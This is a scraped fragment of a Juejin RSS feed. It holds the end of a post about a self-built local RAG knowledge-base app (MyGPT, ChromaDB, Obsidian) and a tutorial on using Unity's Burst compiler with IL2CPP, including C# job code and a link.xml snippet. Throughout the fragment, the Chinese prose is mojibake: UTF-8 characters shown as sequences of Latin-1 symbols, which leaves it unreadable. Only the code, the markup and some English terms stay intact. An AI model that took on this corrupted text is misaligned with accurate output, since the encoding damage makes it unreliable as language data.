<p>å®Œæˆè¿™ä¸€æ­¥åï¼Œæˆ‘ä»¬çš„çŸ¥è¯†åº“å†…å®¹å°±å¯ä»¥è¢«å¤§æ¨¡å‹æ£€ç´¢å’Œè¯†åˆ«äº†ã€‚æ¥ä¸‹æ¥å°±æ˜¯ç¬¬äºŒæ­¥ï¼šå¤§æ¨¡å‹é€šè¿‡ RAG çš„æ–¹å¼å›ç­”æˆ‘ä»¬çš„ç§äººé—®é¢˜ã€‚</p>
<p>å®ƒé¦–å…ˆä¼šè¯†åˆ«ç”¨æˆ·çš„é—®é¢˜ï¼ŒæŠŠç”¨æˆ·çš„é—®é¢˜ä¹Ÿè½¬æˆå‘é‡ï¼Œç„¶ååœ¨ ChromaDB ä¸­å¿«é€Ÿå¯»æ‰¾ä¸é—®é¢˜æœ€ç›¸å…³çš„ç¬”è®°ç‰‡æ®µï¼ˆTop-Kï¼‰ã€‚å°†æ‰¾å‡ºçš„æ–‡æ¡£å—æ‹¼æ¥åˆ° Prompt ä¸­ï¼Œè°ƒç”¨æœ¬åœ°çš„æ¨ç†æ¨¡å‹ç”Ÿæˆç­”æ¡ˆï¼Œæˆ‘ä½¿ç”¨çš„æœ¬åœ°æ¨ç†æ¨¡å‹æ˜¯ qwen-corder3:30bã€‚</p>
<h2 data-id="heading-3">æ„å»ºå±äºè‡ªå·±çš„ MyGPT</h2>
<p>æ„å»ºæœ¬åœ°çŸ¥è¯†åº“ä¹Ÿæœ‰å¾ˆå¤šç§é€‰æ‹©ï¼Œä¹Ÿæœ‰äº›å¼€æºçš„äº§å“é€‰æ‹©ï¼Œæ¯”å¦‚ RAGFlow æˆ–è€… PrivateGPTã€‚æˆ‘ä¸ªäººæ˜¯é€‰æ‹©äº†è‡ªå·±å¼€å‘ï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªåŸå› ï¼š</p>
<ul>
<li>RAGFlow è™½ç„¶èƒ½åŠ›å¾ˆå¼ºä½†æ˜¯ç‰¹åˆ«çš„é‡ï¼Œå®ƒéœ€è¦è·‘ Dockerï¼Œå¯åŠ¨ä¸€å †æœåŠ¡ã€‚</li>
<li>PrivateGPT è™½ç„¶ç›¸å¯¹è½»é‡ï¼Œä½†ä¹Ÿéœ€è¦ä¸€å®šçš„ç ”ç©¶æˆæœ¬ï¼Œä¸”æœ€é‡è¦çš„æ˜¯ï¼Œæˆ‘å¸Œæœ›èƒ½å¤Ÿè¿›è¡Œé«˜åº¦çš„ä¸ªæ€§åŒ–å®šåˆ¶ã€‚</li>
</ul>
<p>å› æ­¤ï¼Œæˆ‘ç”¨Â <code>electron</code>Â æ„å»ºäº†ä¸€ä¸ª mac åŸç”Ÿçš„åº”ç”¨ï¼Œå…¶ä¸­çš„æ ¸å¿ƒæ¨¡å—ä¹‹ä¸€å°±æ˜¯ MyGPTã€‚ç›®å‰ï¼Œè¿™ä¸ª MyGPT å·²ç»å®Œç¾å®ç°äº†ä¸Šè¿°çš„ä¸ªäººçŸ¥è¯†åº“é—®ç­”åŠŸèƒ½ã€‚æœªæ¥ï¼Œæˆ‘è¿˜è®¡åˆ’åŠ å…¥å·¥å…·è°ƒç”¨åŠŸèƒ½ï¼Œä»è€Œå®ç°çœŸæ­£çš„æœ¬åœ° Agentã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cd2219a09d04125aa4a33bf75e8cad3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767594851&amp;x-signature=Du5qFCYlPl8BSRFhrGICi70kNX8%3D" alt="" loading="lazy"/></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæˆ‘å¯ä»¥é—®ï¼šâ€œæˆ‘ä»Šå¹´çš„å–æš–è´¹äº¤äº†æ²¡ï¼Œäº¤äº†å¤šå°‘é’±ï¼Ÿâ€å®ƒä¸ä»…èƒ½ç²¾å‡†åœ°å‘Šè¯‰æˆ‘ç­”æ¡ˆï¼Œè¿˜ä¼šåˆ—å‡ºåŸå§‹æ–‡æ¡£çš„å‚è€ƒæ¥æºã€‚<strong>ç‚¹å‡»è¿™ä¸ªå‚è€ƒæ¥æºï¼Œå¯ä»¥ç›´æ¥è·³è½¬åˆ° Obsidian çš„åŸå§‹æ–‡æ¡£ï¼Œè¿™æ˜¯è®¸å¤šå…¶ä»– RAG äº§å“æ‰€æ— æ³•åšåˆ°çš„ä½“éªŒã€‚</strong></p>
<p>åˆ©ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œæˆ‘ä¹Ÿå°†å´å†›è€å¸ˆçš„ä¸€äº›å†…å®¹åˆ¶ä½œæˆäº†çŸ¥è¯†åº“ï¼Œä½œä¸ºæˆ‘çš„ç¬¬ä¸‰æ–¹å¤–éƒ¨çŸ¥è¯†åº“åŠ ä»¥åˆ©ç”¨ã€‚æˆ‘å¯ä»¥åœ¨åšé—®ç­”çš„æ—¶å€™é€‰æ‹©åŠ è½½çš„çŸ¥è¯†åº“ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50fa1b6fcf634981bdf75f5a399463b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767594851&amp;x-signature=VftcusbwZ57SCJyjLpu5JWvzKDY%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœä½ ä¹Ÿæœ‰å’Œæˆ‘ç±»ä¼¼çš„éœ€æ±‚ï¼Œä¹Ÿå¯ä»¥è¯•è¯•æˆ‘ç°åœ¨çš„è¿™ç§åšæ³•ã€‚</p>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">è¿™é‡Œ</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Unity3D IL2CPPå¦‚ä½•è°ƒç”¨Burst]]></title>    <link>https://juejin.cn/post/7588733783572414502</link>    <guid>https://juejin.cn/post/7588733783572414502</guid>    <pubDate>2025-12-29T06:46:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588733783572414502" data-draft-id="7588799600166502410" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Unity3D IL2CPPå¦‚ä½•è°ƒç”¨Burst"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-29T06:46:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Thomasæ¸¸æˆå¼€å‘"/> <meta itemprop="url" content="https://juejin.cn/user/3758599706256028"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Unity3D IL2CPPå¦‚ä½•è°ƒç”¨Burst
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3758599706256028/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Thomasæ¸¸æˆå¼€å‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:46:08.000Z" title="Mon Dec 29 2025 06:46:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Unity ä¸­ä½¿ç”¨ IL2CPP è„šæœ¬åç«¯æ—¶ï¼Œè°ƒç”¨Â <strong>Burst ç¼–è¯‘å™¨ä¼˜åŒ–ä»£ç çš„æ ¸å¿ƒæ–¹æ³•</strong>ä¸åœ¨å…¶ä»–åç«¯ï¼ˆå¦‚ Monoï¼‰ä¸‹æ˜¯åŸºæœ¬ä¸€è‡´çš„ã€‚Burst ä¸»è¦ç”¨äºåŠ é€Ÿä½¿ç”¨ Unity Job System æˆ–å®ä½“ç»„ä»¶ç³»ç»Ÿ (ECS) ç¼–å†™çš„æ€§èƒ½æ•æ„Ÿå‹ä»£ç </p>
<p><strong>å¯¹æƒ¹ï¼Œè¿™é‡Œæœ‰ä¸€</strong><a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%253A%2F%2Fqm.qq.com%2Fcgi-bin%2Fqm%2Fqr%253F_wv%253D1027%2526k%253DdMAq1DlcS381YbFZmdb7BtZY0P6oUBtl%2526authKey%253DhZcaQ9EFvMcDLf%25252FPsKrFKENOeVlSVBMgFEsh1P43L2ZfSUQZjAndaA5MFK5IsGBM%2526noverify%253D0%2526group_code%253D682143601" target="_blank" title="https://link.zhihu.com/?target=http%3A//qm.qq.com/cgi-bin/qm/qr%3F_wv%3D1027%26k%3DdMAq1DlcS381YbFZmdb7BtZY0P6oUBtl%26authKey%3DhZcaQ9EFvMcDLf%252FPsKrFKENOeVlSVBMgFEsh1P43L2ZfSUQZjAndaA5MFK5IsGBM%26noverify%3D0%26group_code%3D682143601" ref="nofollow noopener noreferrer">ä¸ªæ¸¸æˆå¼€å‘äº¤æµå°ç»„</a> <strong>ï¼Œå¸Œæœ›å¤§å®¶å¯ä»¥ç‚¹å‡»è¿›æ¥ä¸€èµ·äº¤æµä¸€ä¸‹å¼€å‘ç»éªŒå‘€ï¼</strong></p>
<p>ä¸‹é¢çš„è¡¨æ ¼æ¦‚æ‹¬äº†è°ƒç”¨ Burst çš„å…³é”®æ­¥éª¤ä¸è¦ç‚¹ï¼š</p>

























<table><thead><tr><th>æ­¥éª¤</th><th>å…³é”®æ“ä½œ</th><th>è¯´æ˜ä¸ç›®çš„</th></tr></thead><tbody><tr><td>1. å‡†å¤‡ä»£ç </td><td>ä½¿ç”¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%253A%2F%2FUnity.Jobs" target="_blank" title="https://link.zhihu.com/?target=http%3A//Unity.Jobs" ref="nofollow noopener noreferrer">Unity.Jobs</a>Â å‘½åç©ºé—´ä¸‹çš„æ¥å£ï¼ˆå¦‚ IJobï¼‰ç¼–å†™ä¸€ä¸ªç»“æ„ä½“ã€‚</td><td>å®šä¹‰å°†è¢«å¹¶è¡Œæ‰§è¡Œçš„ä»»åŠ¡ã€‚</td></tr><tr><td>2. åº”ç”¨å±æ€§</td><td>ä¸ºç»“æ„ä½“æ·»åŠ  [BurstCompile] ç‰¹æ€§ã€‚</td><td>æ ‡è®°æ­¤ä»£ç éœ€è¦ç”± Burst ç¼–è¯‘å™¨è¿›è¡Œä¼˜åŒ–ç¼–è¯‘ã€‚</td></tr><tr><td>3. å®‰æ’æ‰§è¡Œ</td><td>åˆ›å»ºè¯¥ç»“æ„ä½“çš„å®ä¾‹ï¼Œå¡«å……æ•°æ®ï¼Œå¹¶è°ƒç”¨å…¶ Schedule() æ–¹æ³•ã€‚</td><td>å°†ä»»åŠ¡æäº¤ç»™ Job System è°ƒåº¦æ‰§è¡Œã€‚</td></tr></tbody></table>
<h3 data-id="heading-0">ğŸ› ï¸ è¯¦ç»†æ“ä½œæŒ‡å—</h3>
<p>ä¸€ä¸ªå…¸å‹çš„ Burst ä»£ç è°ƒç”¨ç¤ºä¾‹å¦‚ä¸‹</p>
<pre><code class="hljs language-ini" lang="ini">using Unity.Burst<span class="hljs-comment">;</span>
using Unity.Collections<span class="hljs-comment">;</span>
using Unity.Jobs<span class="hljs-comment">;</span>
using UnityEngine<span class="hljs-comment">;</span>

public class MyBurstBehavior : MonoBehaviour
{
    void Start()
    {
        // 1. ä½¿ç”¨NativeContaineråˆ†é…éæ‰˜ç®¡å†…å­˜
        var <span class="hljs-attr">input</span> = new NativeArray&lt;float&gt;(<span class="hljs-number">10</span>, Allocator.TempJob)<span class="hljs-comment">;</span>
        var <span class="hljs-attr">output</span> = new NativeArray&lt;float&gt;(<span class="hljs-number">1</span>, Allocator.TempJob)<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; input.Length; i++)</span>
            input<span class="hljs-section">[i]</span> = i<span class="hljs-comment">;</span>

        // 2. å®ä¾‹åŒ–Burstç¼–è¯‘çš„Job
        var <span class="hljs-attr">job</span> = new MyJob { Input = input, Output = output }<span class="hljs-comment">;</span>

        // 3. è°ƒåº¦å¹¶ç­‰å¾…Jobå®Œæˆ
        job.Schedule().Complete()<span class="hljs-comment">;</span>

        Debug.Log("ç»“æœ: " + output<span class="hljs-section">[0]</span>)<span class="hljs-comment">;</span>
        
        // 4. é‡Šæ”¾åˆ†é…çš„å†…å­˜
        input.Dispose()<span class="hljs-comment">;</span>
        output.Dispose()<span class="hljs-comment">;</span>
    }

    // ä½¿ç”¨<span class="hljs-section">[BurstCompile]</span>ç‰¹æ€§æ ‡è®°Jobç»“æ„ä½“
    <span class="hljs-section">[BurstCompile]</span>
    struct MyJob : IJob
    {
        <span class="hljs-section">[ReadOnly]</span> public NativeArray&lt;float&gt; Input<span class="hljs-comment">;</span>
        <span class="hljs-section">[WriteOnly]</span> public NativeArray&lt;float&gt; Output<span class="hljs-comment">;</span>

        public void Execute()
        {
            float <span class="hljs-attr">result</span> = <span class="hljs-number">0.0</span>f<span class="hljs-comment">;</span>
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; Input.Length; i++)</span>
                result += Input<span class="hljs-section">[i]</span><span class="hljs-comment">;</span>
            Output<span class="hljs-section">[0]</span> = result<span class="hljs-comment">;</span>
        }
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹è§£æ</strong>ï¼š</p>
<ul>
<li><strong>NativeContainer</strong>ï¼šBurst ä»£ç åº”ä½¿ç”¨Â <code>NativeArray</code>Â ç­‰ç±»å‹æ¥æ“ä½œæ•°æ®ï¼Œé¿å…ä½¿ç”¨ä¼šè§¦å‘åƒåœ¾å›æ”¶çš„æ‰˜ç®¡å¯¹è±¡<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fjuejin.cn%2Fpost%2F7210369671655620663" target="_blank" title="https://link.zhihu.com/?target=https%3A//juejin.cn/post/7210369671655620663" ref="nofollow noopener noreferrer">-7</a>ã€‚</li>
<li><strong>BurstCompile ç‰¹æ€§</strong>ï¼šè¿™æ˜¯æ¿€æ´» Burst ç¼–è¯‘çš„å…³é”®ã€‚ä½ å¯ä»¥åœ¨å…¶ä¸­è®¾ç½®å‚æ•°ï¼Œä¾‹å¦‚Â <code>[BurstCompile(CompileSynchronously = true)]</code>Â å¯ä»¥ç¡®ä¿åœ¨é¦–æ¬¡è°ƒåº¦æ—¶åŒæ­¥ç¼–è¯‘ï¼Œé¿å…è¿è¡Œæ—¶å¡é¡¿<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fjuejin.cn%2Fpost%2F7210369671655620663" target="_blank" title="https://link.zhihu.com/?target=https%3A//juejin.cn/post/7210369671655620663" ref="nofollow noopener noreferrer">-7</a>ã€‚</li>
<li><strong>HPC# è§„èŒƒ</strong>ï¼šä¸ºäº†è·å¾—æœ€ä½³ä¼˜åŒ–ï¼ŒBurst è¦æ±‚ä»£ç éµå¾ªé«˜æ€§èƒ½ C# (HPC#) å­é›†ï¼Œä¾‹å¦‚é¿å…ä½¿ç”¨ç±»ã€å§”æ‰˜ã€å¤§å¤šæ•°å¼•ç”¨ç±»å‹å’Œå¤æ‚çš„åƒåœ¾å›æ”¶æœºåˆ¶<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fjuejin.cn%2Fpost%2F7210369671655620663" target="_blank" title="https://link.zhihu.com/?target=https%3A//juejin.cn/post/7210369671655620663" ref="nofollow noopener noreferrer">-7</a>ã€‚</li>
</ul>
<h3 data-id="heading-1">âš™ï¸ IL2CPP ç¯å¢ƒä¸‹çš„ç‰¹æ®Šé…ç½®</h3>
<p>åœ¨ IL2CPP åç«¯ä¸‹å‘å¸ƒé¡¹ç›®æ—¶ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p>
<ol>
<li><strong>å¤„ç†ä»£ç è£å‰ªï¼ˆCode Strippingï¼‰</strong><br/>
IL2CPP åœ¨æ„å»ºæ—¶ä¼šè£å‰ªæœªä½¿ç”¨çš„ä»£ç ã€‚å¦‚æœ Burst ç¼–è¯‘çš„ Job è¢«é”™è¯¯è£å‰ªï¼Œä¼šå¯¼è‡´è¿è¡Œæ—¶é”™è¯¯ï¼ˆå¦‚Â <code>DllNotFoundException</code>Â æˆ–æ‰¾ä¸åˆ°å†…éƒ¨å‡½æ•°ï¼‰ã€‚è§£å†³æ–¹æ³•æ˜¯<strong>ä½¿ç”¨</strong> <strong><code>link.xml</code></strong> <strong>æ–‡ä»¶æ¥ä¿ç•™å¿…è¦çš„ç¨‹åºé›†å’Œç±»å‹</strong><a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fcloud.tencent.cn%2Fdeveloper%2Fask%2Fsof%2F107723263%253Ffrom%253D16139" target="_blank" title="https://link.zhihu.com/?target=https%3A//cloud.tencent.cn/developer/ask/sof/107723263%3Ffrom%3D16139" ref="nofollow noopener noreferrer">-4</a>ã€‚<br/>
å°†åä¸ºÂ <code>link.xml</code>Â çš„æ–‡ä»¶æ”¾åœ¨é¡¹ç›®çš„Â <code>Assets</code>Â æ–‡ä»¶å¤¹ä¸­ï¼Œå†…å®¹ç¤ºä¾‹å¦‚ä¸‹</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">linker</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">assembly</span> <span class="hljs-attr">fullname</span>=<span class="hljs-string">"Unity.Burst"</span> <span class="hljs-attr">preserve</span>=<span class="hljs-string">"all"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">assembly</span> <span class="hljs-attr">fullname</span>=<span class="hljs-string">"Unity.Collections"</span> <span class="hljs-attr">preserve</span>=<span class="hljs-string">"all"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">assembly</span> <span class="hljs-attr">fullname</span>=<span class="hljs-string">"Unity.Jobs"</span> <span class="hljs-attr">preserve</span>=<span class="hljs-string">"all"</span>/&gt;</span>
    <span class="hljs-comment">&lt;!-- æ ¹æ®ä½ å®é™…ä½¿ç”¨çš„ç¨‹åºé›†æ·»åŠ  --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">linker</span>&gt;</span>
</code></pre>
<ol>
<li><strong>æ³¨æ„ç¼–è¯‘å™¨é€‰é¡¹</strong><br/>
åœ¨Â <code>[BurstCompile]</code>Â ç‰¹æ€§ä¸­ï¼Œ<code>CompileSynchronously = true</code>Â é€‰é¡¹åœ¨ IL2CPP å¼€å‘æ„å»ºé˜¶æ®µå°¤å…¶æœ‰ç”¨ï¼Œå¯ä»¥ç¡®ä¿ä»£ç åœ¨æ„å»ºæ—¶å°±è¢«ç¼–è¯‘ï¼Œæ–¹ä¾¿æ—©æœŸå‘ç°é—®é¢˜ã€‚</li>
</ol>
<h3 data-id="heading-2">ğŸ”§ å¦‚ä½•è¿›ä¸€æ­¥æ’æŸ¥ä¸ä¼˜åŒ–ï¼Ÿ</h3>
<p>å¦‚æœåœ¨ IL2CPP æ„å»ºåé‡åˆ°ä¸ Burst ç›¸å…³çš„é—®é¢˜ï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹æ–¹æ³•ï¼š</p>
<ul>
<li><strong>æ£€æŸ¥ Burst Inspector</strong>ï¼šåœ¨ Unity ç¼–è¾‘å™¨èœå•æ ä¸­é€‰æ‹©Â <strong>Jobs &gt; Burst &gt; Open Inspector</strong>ã€‚è¿™é‡Œå¯ä»¥æŸ¥çœ‹ä½ çš„ Job æ˜¯å¦å·²è¢«æˆåŠŸç¼–è¯‘ï¼Œå¹¶æ£€æŸ¥ç”Ÿæˆçš„ä¼˜åŒ–ä»£ç ã€‚</li>
<li><strong>ç¡®è®¤ä¾èµ–åŒ…</strong>ï¼šç¡®ä¿é¡¹ç›®ä¸­å·²ç»æ­£ç¡®å®‰è£…äº†Â <strong>Burst</strong>Â å’ŒÂ <strong>Mathematics</strong>Â åŒ…ï¼Œå®ƒä»¬é€šå¸¸é€šè¿‡ Package Manager å®‰è£…ã€‚</li>
<li><strong>ç®€åŒ–æµ‹è¯•</strong>ï¼šå¦‚æœé‡åˆ°å´©æºƒï¼Œå¯ä»¥å°è¯•åˆ›å»ºä¸€ä¸ªä»…åŒ…å«æœ€ç®€å• Burst Job çš„æ–°åœºæ™¯è¿›è¡Œæµ‹è¯•ï¼Œä»¥æ’é™¤å…¶ä»–ä»£ç æˆ–èµ„æºçš„å¹²æ‰°<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fcloud.tencent.cn%2Fdeveloper%2Fask%2Fsof%2F107723263%253Ffrom%253D16139" target="_blank" title="https://link.zhihu.com/?target=https%3A//cloud.tencent.cn/developer/ask/sof/107723263%3Ffrom%3D16139" ref="nofollow noopener noreferrer">-4</a>ã€‚</li>
</ul>
<p>æ€»ç»“æ¥è¯´ï¼Œåœ¨IL2CPPåç«¯ä½¿ç”¨Burstï¼Œæ ¸å¿ƒæ˜¯éµå¾ªHPC#è§„èŒƒç¼–å†™Jobä»£ç å¹¶ç”¨<code>[BurstCompile]</code>æ ‡è®°ï¼Œç„¶ååœ¨æ„å»ºæ—¶é€šè¿‡<code>link.xml</code>é˜²æ­¢ä»£ç è¢«é”™è¯¯è£å‰ªã€‚</p>
<p>å¦‚æœä½ æƒ³äº†è§£ç‰¹å®šå¹³å°ï¼ˆå¦‚ iOS æˆ– Androidï¼‰ä¸Šä½¿ç”¨ Burst å’Œ IL2CPP çš„æ›´è¯¦ç»†æ„å»ºè®¾ç½®ï¼Œæˆ‘å¯ä»¥ä¸ºä½ è¿›ä¸€æ­¥ä»‹ç»ã€‚</p>
<p><strong>æ›´å¤šæ•™å­¦è§†</strong></p>
